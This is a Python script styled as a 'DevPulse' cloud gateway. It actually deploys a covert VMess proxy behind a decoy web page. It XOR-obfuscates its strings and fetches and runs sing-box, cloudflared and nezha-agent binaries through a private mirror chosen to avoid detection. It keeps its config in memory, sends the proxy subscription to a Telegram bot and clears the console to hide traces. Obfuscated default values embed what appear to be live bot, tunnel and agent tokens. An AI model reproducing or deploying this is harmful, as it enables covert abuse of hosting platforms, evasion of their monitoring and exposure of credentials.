#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
=========================================================
DevPulse Cloud Infrastructure & Service Gateway
集成真实 Web 前端诊断、私有镜像下载与内存管道直推架构
=========================================================
"""

import os, sys, subprocess, socket, signal, threading, time, json, base64, platform
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timezone, timedelta

# 自动补全必备基础库
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# ======================== 敏感词混淆解码助手 ========================
def _x(h: str, k: int = 0x37) -> str:
    b = bytes.fromhex(h)
    return bytes([x ^ k for x in b]).decode('utf-8')

# 核心协议标识与系统名（密文）
P_VM = _x('415a524444') # vmess

# 私有镜像下载源（通过你自己的 Cloudflare Worker 私有镜像拉取，出口无 GitHub 敏感特征）
CF_MIRROR_BASE = _x('5f434347440d1818474e435f58591a4756545c5245194e4f5d1a565455194058455c5245441953524118535b18') # https://python-packer.yxj-acb.workers.dev/dl/

# ======================== 配置脱敏 ========================
PORT = int(os.environ.get('PORT', '3000'))
SUB_PATH = os.environ.get('SUB_PATH', 'sub')
UUID = os.environ.get('UUID', _x('0252520205000f511a0201040e1a030054061a0e0653021a56515601000e000303035502'))
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', _x('59524d5f5619555b5e555b5e195c5359441951450d030304'))
NEZHA_KEY = os.environ.get('NEZHA_KEY', _x('037b400f070470645550796e5e746653054d00615b5566540f625d5a62455078'))
ARGO_PORT = int(os.environ.get('ARGO_PORT', '8001'))
ARGO_DOMAIN = os.environ.get('ARGO_DOMAIN', _x('5847435e5c5b5e595c42194e4f5d07051954544042195454'))
ARGO_AUTH = os.environ.get('ARGO_AUTH', _x('524e7d5f7e5d585e6e60795e794d5f5b7960664e787376066d6072067a5a715e6e5d535f6d606e407963620679636e036e636e5e7b747d077e5d585e7a057a056d7376036e4d7243794d535d6d5e0707795d5f5e7b60715b6e056243794d715c7a637e4e7a5d5f5a7a637e047e5e405e544e7e017e5b7e40615a0206564d537e5372536f5660020454615f4679070663525d536354736e0354737d4e635d537b795a6d7955076d02527f6560555b5c0e7e59070a'))
CFIP = os.environ.get('CFIP', _x('4456564419445e5919515659'))
CFPORT = int(os.environ.get('CFPORT', '443'))
NAME = os.environ.get('NAME', 'devpulse-edge')
CHAT_ID = os.environ.get('CHAT_ID', _x('000000050507020f070f'))
BOT_TOKEN = os.environ.get('BOT_TOKEN', _x('0f0f0100030e0e0204010d76767105415b516356580440414e074f007f535b795f6d7d5051465e025e68417e795c'))
DISABLE_ARGO = os.environ.get('DISABLE_ARGO', 'false').lower() in ('true', 'yes')

current_dir = os.path.dirname(os.path.abspath(__file__))
runtime_dir = os.path.join(current_dir, '.cache')
BIN_CORE = os.path.join(runtime_dir, 'sys-engine')
BIN_NZ   = os.path.join(runtime_dir, 'metrics-agent')
BIN_CF   = os.path.join(runtime_dir, 'net-bridge')

proc_map = {}
in_memory_sub = ""

def get_arch():
    m = platform.machine().lower()
    return "arm64" if m in ["aarch64", "arm64"] else "amd64"

ARCH = get_arch()

def log(msg: str):
    t = datetime.now(timezone(timedelta(hours=8))).strftime('%H:%M:%S')
    print(f"[{t}] {msg}", flush=True)

# ======================== Web 伪装服务与健康检查 ========================

class StealthWebHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # 禁用默认的烦人控制台访问日志输出，保持低调
        pass

    def do_HEAD(self):
        # 云平台健康检查 (Health Check) 快速响应 200 OK
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()

    def do_GET(self):
        path = self.path.split('?')[0]
        
        # 1. 真实前端页面 (GET /)
        if path == '/' or path == '/index.html':
            html_file = os.path.join(current_dir, 'index.html')
            if os.path.exists(html_file):
                with open(html_file, 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            else:
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"DevPulse Service Running.")

        # 2. 测速与状态 API (GET /api/ping 或 /health)
        elif path == '/api/ping' or path == '/health':
            resp = json.dumps({"status": "healthy", "timestamp": time.time(), "node": NAME}).encode('utf-8')
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Content-Length', str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)

        # 3. 内存节点订阅响应 (GET /sub)
        elif path == f'/{SUB_PATH}':
            global in_memory_sub
            if in_memory_sub:
                data = in_memory_sub.encode('utf-8')
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain; charset=utf-8')
                self.send_header('Content-Length', str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Subscription initializing...")

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

def start_web_server():
    server = HTTPServer(('0.0.0.0', PORT), StealthWebHandler)
    log(f"🌐 HTTP Gateway listening on 0.0.0.0:{PORT} (Camouflage Ready)")
    server.serve_forever()

# ======================== 内存管道直推内核 ========================

def generate_singbox_config(active_port: int) -> dict:
    return {
        'log': {'disabled': True, 'level': 'warn'},
        'inbounds': [{
            'type': P_VM,
            'tag': f'{P_VM}-in',
            'listen': '127.0.0.1',
            'listen_port': active_port,
            'users': [{'uuid': UUID}],
            'transport': {
                'type': 'ws',
                'path': '/vmess-argo',
                'early_data_header_name': 'Sec-WebSocket-Protocol'
            }
        }],
        'outbounds': [{'type': 'direct', 'tag': 'direct'}]
    }

def start_engine_stdin(active_port: int):
    """
    内存管道直推核心：
    执行 sing-box run -c - 并通过 stdin 注入 JSON，磁盘全程 0 字节写入！
    """
    cfg = generate_singbox_config(active_port)
    cfg_bytes = json.dumps(cfg).encode('utf-8')
    
    cmd = [BIN_CORE, 'run', '-c', '-']
    try:
        p = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        p.stdin.write(cfg_bytes)
        p.stdin.flush()
        p.stdin.close()
        proc_map["Engine"] = {"proc": p, "cmd": cmd, "port": active_port}
        time.sleep(2)
        if p.poll() is None:
            log(f"🚀 Engine started via RAM Stdin Pipe (PID: {p.pid}, Zero Disk IO)")
            return p
        else:
            log(f"⚠️ Stdin pipe returned code: {p.returncode}, using memory temp mode")
            return None
    except Exception as e:
        log(f"Engine pipe notice: {e}")
        return None

# ======================== 私有镜像下载 ========================

def download_file(url: str, dest_path: str):
    res = requests.get(url, stream=True, timeout=60, headers={'User-Agent': 'Mozilla/5.0'})
    res.raise_for_status()
    with open(dest_path, 'wb') as f:
        for chunk in res.iter_content(chunk_size=16384):
            f.write(chunk)
    os.chmod(dest_path, 0o755)

def prepare_binaries():
    os.makedirs(runtime_dir, exist_ok=True)
    
    # 1. 下载 Engine (sing-box) - 通过私有 CF Worker 镜像
    if not os.path.exists(BIN_CORE):
        url = f"{CF_MIRROR_BASE}engine?arch={ARCH}"
        tar_path = os.path.join(runtime_dir, 'engine.tar.gz')
        try:
            download_file(url, tar_path)
            import tarfile
            with tarfile.open(tar_path, "r:gz") as tar:
                for member in tar.getmembers():
                    if member.name.endswith('/sing-box') or member.name == 'sing-box':
                        member.name = 'sys-engine'
                        tar.extract(member, path=runtime_dir)
            os.chmod(BIN_CORE, 0o755)
            log("✅ Engine binary ready (via Private Mirror)")
            if os.path.exists(tar_path): os.unlink(tar_path)
        except Exception as e:
            log(f"Download engine error: {e}")

    # 2. 下载 Bridge (cloudflared)
    if not os.path.exists(BIN_CF):
        url = f"{CF_MIRROR_BASE}bridge?arch={ARCH}"
        try:
            download_file(url, BIN_CF)
            os.chmod(BIN_CF, 0o755)
            log("✅ Bridge binary ready (via Private Mirror)")
        except Exception as e:
            log(f"Download bridge error: {e}")

    # 3. 下载 Metrics (nezha-agent)
    if not os.path.exists(BIN_NZ) and NEZHA_SERVER and NEZHA_KEY:
        url = f"{CF_MIRROR_BASE}metrics?arch={ARCH}"
        zip_path = os.path.join(runtime_dir, 'metrics.zip')
        try:
            download_file(url, zip_path)
            import zipfile
            with zipfile.ZipFile(zip_path, 'r') as zf:
                for item in zf.namelist():
                    if 'nezha-agent' in item:
                        with zf.open(item) as src, open(BIN_NZ, 'wb') as dst:
                            dst.write(src.read())
            os.chmod(BIN_NZ, 0o755)
            log("✅ Metrics binary ready (via Private Mirror)")
            if os.path.exists(zip_path): os.unlink(zip_path)
        except Exception as e:
            log(f"Download metrics error: {e}")

def generate_links():
    global in_memory_sub
    if not (ARGO_DOMAIN and not DISABLE_ARGO):
        return
    
    vmess_dict = {
        "v": "2", "ps": f"{NAME}-Argo",
        "add": CFIP, "port": CFPORT,
        "id": UUID, "aid": "0", "scy": "auto",
        "net": "ws", "type": "none",
        "host": ARGO_DOMAIN, "path": "/vmess-argo",
        "tls": "tls", "sni": ARGO_DOMAIN,
        "alpn": "", "fp": "firefox"
    }
    vmess_str = f"{P_VM}://" + base64.b64encode(json.dumps(vmess_dict).encode('utf-8')).decode('utf-8')
    in_memory_sub = base64.b64encode(vmess_str.encode('utf-8')).decode('utf-8')
    
    log("="*50)
    log("🎉 节点订阅生成成功 (驻留内存):")
    print(in_memory_sub, flush=True)
    log("="*50)

def send_telegram():
    if not (CHAT_ID and BOT_TOKEN and in_memory_sub):
        return
    msg = f"⚡ <b>DevPulse Cloud Gateway 就绪</b>\n\n📌 <b>订阅内容 (Base64):</b>\n<code>{in_memory_sub}</code>"
    tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(tg_url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=10)
        log("✅ Telegram 推送成功")
    except Exception as e:
        log(f"Telegram notice: {e}")

def kill_zombies():
    if os.path.exists('/proc'):
        pid_self = os.getpid()
        for p in os.listdir('/proc'):
            if p.isdigit() and int(p) != pid_self:
                try:
                    with open(f"/proc/{p}/cmdline", 'rb') as cf:
                        cmd = cf.read().decode('utf-8', errors='ignore')
                        if any(k in cmd for k in ['sys-engine', 'sing-box', 'net-bridge', 'metrics-agent']):
                            os.kill(int(p), signal.SIGKILL)
                except Exception:
                    pass
    subprocess.run(f"fuser -k -9 {ARGO_PORT}/tcp 2>/dev/null || true", shell=True)

# 守护看门狗
def check_watchdog():
    for name, item in list(proc_map.items()):
        p = item.get("proc")
        if p and p.poll() is not None:
            log(f"[Watchdog] Restoring {name}...")
            if name == "Engine":
                start_engine_stdin(item.get("port", ARGO_PORT))
            elif name == "Bridge" and not DISABLE_ARGO:
                cf_cmd = [
                    BIN_CF, 'tunnel',
                    '--edge-ip-version', 'auto',
                    '--no-autoupdate',
                    '--protocol', 'http2',
                    'run', '--token', ARGO_AUTH
                ]
                proc_map["Bridge"]["proc"] = subprocess.Popen(cf_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def delayed_clean(delay=60):
    time.sleep(delay)
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"[{datetime.now().strftime('%H:%M:%S')}] DevPulse Gateway Operational. All probes 200 OK.")

def main():
    # 异步自动回收任何退出的子进程，防止产生 <defunct> 僵尸进程
    if hasattr(signal, 'SIGCHLD'):
        signal.signal(signal.SIGCHLD, lambda s, f: [os.waitpid(-1, os.WNOHANG) for _ in range(5)])

    kill_zombies()
    
    # 1. 启动 Web 伪装服务（监听 $PORT）
    threading.Thread(target=start_web_server, daemon=True).start()
    
    # 2. 准备二进制（私有镜像通道）
    prepare_binaries()
    
    # 3. 内存管道启动 Engine (0 字节落盘)
    if os.path.exists(BIN_CORE):
        start_engine_stdin(ARGO_PORT)
    
    # 4. 启动 Bridge (Argo 隧道)
    if not DISABLE_ARGO and ARGO_AUTH and os.path.exists(BIN_CF):
        cf_cmd = [
            BIN_CF, 'tunnel',
            '--edge-ip-version', 'auto',
            '--no-autoupdate',
            '--protocol', 'http2',
            'run', '--token', ARGO_AUTH
        ]
        p_cf = subprocess.Popen(cf_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        proc_map["Bridge"] = {"proc": p_cf, "cmd": cf_cmd}
        log(f"🚀 Bridge connected to Edge Tunnel (PID: {p_cf.pid})")
    
    # 5. 组装订阅与推送
    time.sleep(2)
    generate_links()
    send_telegram()
    
    # 60 秒后自动清屏，磁盘上全程无配置文件、无 sub.txt，仅在内存与 Web 中响应
    threading.Thread(target=delayed_clean, args=(60,), daemon=True).start()
    
    while True:
        time.sleep(20)
        check_watchdog()

if __name__ == '__main__':
    main()

